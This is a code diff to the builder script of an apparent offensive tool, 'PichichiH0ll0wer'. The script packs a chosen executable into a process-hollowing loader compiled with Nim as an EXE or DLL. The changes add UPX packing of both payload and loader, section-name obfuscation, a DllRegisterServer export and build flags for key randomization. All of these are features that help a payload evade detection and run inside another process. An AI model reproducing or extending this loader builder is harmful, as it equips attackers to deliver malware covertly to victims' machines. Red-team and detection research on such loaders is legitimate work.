@@ -1,3 +1,4 @@
+import os
 import argparse
 import strformat
 from std/base64 import encode
@@ -29,15 +30,24 @@ var outDllExportName: string
 var sleepSeconds: string
 
 # Define compiler args
-var compileExeCmd = "nim compile --app:console"                     # exe format
-var compileDllCmd = "nim compile --app:lib --nomain"                # dll format
-var compileInOutExe = " -o:Loader/main.nim PichichiH0ll0wer.exe"    # for source and compiled exe names
-var compileInOutDll = " -o:Loader/main.nim PichichiH0ll0wer.dll"    # for source and compiled dll names
-var compileFlags = " --cpu=amd64"                                   # for windows 64 bit
-compileFlags.add " -d=mingw"                                        # for cross compiling from linux
-compileFlags.add " -d:release -d:strip --opt:size"                  # for minimal size
-compileFlags.add " --passL:-Wl,--dynamicbase"                       # for relocation table (needed for loaders)
-compileFlags.add " --benchmarkVM:on"                                # for NimProtect key randomization
+var compileExeCmd = "nim compile --app:console"         # exe format
+var compileDllCmd = "nim compile --app:lib --nomain"    # dll format
+var compileExePath = " Loader/main.nim"                 # for source exe
+var compileDllPath = " Loader/dll.nim"                  # for source dll
+var compileOutExe = " -o:PichichiH0ll0wer.exe"          # for compiled exe
+var compileOutDll = " -o:PichichiH0ll0wer.dll"          # for compiles dll
+var compileFlags = " --cpu=amd64"                       # for windows 64 bit
+compileFlags.add " -d=mingw"                            # for cross compiling from linux
+compileFlags.add " -d:release -d:strip --opt:size"      # for minimal size
+compileFlags.add " --passL:-Wl,--dynamicbase"           # for relocation table (needed for loaders)
+compileFlags.add " --benchmarkVM:on"                    # for NimProtect key randomization
+
+proc upxPe(pePath: string): bool =
+    var upxCmd = "upx " & pePath
+    if execShellCmd(upxCmd) == 0:
+        return true
+    else:
+        return false
 
 
 when isMainModule:
@@ -52,12 +62,12 @@ when isMainModule:
         """)
         option("-s", "--sponsor", help="Sponsor path to hollow (default: self hollowing)")
         option("-a", "--args", help="Command line arguments to append to the hollowed process")
-        option("-x", "--upx", help="UPX the exe and/or the hollower and obfuscate section names", choices = @["exe", "hollower", "both"])
+        option("-x", "--upx", help="UPX the exe and/or the hollower and obfuscate section names (UPX should be installed in PATH)", choices = @["exe", "hollower", "both"])
         option("-f", "--format", help="PE hollower format", choices = @["exe", "dll"], default=some("exe"))
-        option("-e", "--exportname", help="Dll export name", default=some("DllRegisterServer"))
+        option("-e", "--exportname", help="DLL export name (relevant only for Dll format)", default=some("DllRegisterServer"))
         option("-t", "--sleep", help="Number of seconds to sleep before hollowing", default=some("0"))
+    # Parse arguments
     try:
-        # Parse arguments
         var opts = p.parse()
         pePath = opts.exe_file
         injectionMethod = opts.injection_method
@@ -78,6 +88,10 @@ when isMainModule:
         stderr.writeLine getCurrentExceptionMsg()
         quit(1)
 
+    # UPX the exe payload
+    if upx in ["exe", "both"]:
+        discard upxPe(pePath)
+
     # Read & compress & encode exe payload
     var peStr = readFile(pePath)
     var compressedPe = compress(peStr)
@@ -97,5 +111,20 @@ var sleepSeconds* = {sleepSeconds}
     """
     writeFile(paramsPath, paramsToHollower)
 
+    # Compile
+    var compileCmd: string
+    if outFormat == "exe":
+        compileCmd = compileExeCmd & compileFlags & compileOutExe & compileExePath
+    elif outFormat == "dll":
+        compileCmd = compileDllCmd & compileFlags & compileOutDll & compileDllPath
+    discard execShellCmd(compileCmd)
 
+    # UPX the hollower
+    if upx in ["hollower", "both"]:
+        if outFormat == "exe":
+            compileOutExe.delete(0..3)
+            discard upxPe(compileOutExe)
+        elif outFormat == "dll":
+            compileOutDll.delete(0..3)
+            discard upxPe(compileOutDll)
     
